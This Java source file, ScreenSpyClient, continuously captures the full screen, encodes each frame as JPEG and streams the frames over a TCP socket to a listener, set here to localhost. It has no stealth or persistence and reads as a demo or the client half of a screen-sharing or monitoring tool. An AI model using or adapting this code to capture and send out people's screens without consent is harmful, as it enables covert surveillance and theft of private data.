package com.client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class ScreenSpyClient implements Runnable {

    private static String SERVER_IP = "127.0.0.1";
    private static int SERVER_PORT = 13267;
    private Robot bot;
    private Rectangle screenRectangle;

    ScreenSpyClient() throws AWTException {
        bot = new Robot();
        screenRectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

    }

    @Override
    public void run() {
        OutputStream outputStream = null;
        Socket socket = new Socket();

        try {
            socket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT));
            outputStream = socket.getOutputStream();

            // Sending
            while (!Thread.interrupted()) {
                sendScreenShot(outputStream);
            }

        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            try {
                socket.close();
                assert outputStream != null;
                outputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void sendScreenShot(OutputStream socketOutputStream) throws IOException {
        ByteArrayOutputStream imageByteStream = captureImageToStream();

        int imageSizeBytes = imageByteStream.size();
        byte[] size = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
                .putInt(imageByteStream.size())
                .array();

        socketOutputStream.write(size);
        socketOutputStream.write(imageByteStream.toByteArray(), 0, imageByteStream.size());
        socketOutputStream.flush();
        imageByteStream.close();

        System.out.println("Flushed: " + imageSizeBytes + " bytes");
    }

    private ByteArrayOutputStream captureImageToStream() throws IOException {
        BufferedImage image = bot.createScreenCapture(screenRectangle);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ImageIO.write(image, "jpg", byteArrayOutputStream);
        return byteArrayOutputStream;
    }

    public static void main(String[] args) throws Exception {
        ScreenSpyClient client = new ScreenSpyClient();
        Thread th = new Thread(client);
        th.start();
        th.join();
    }
}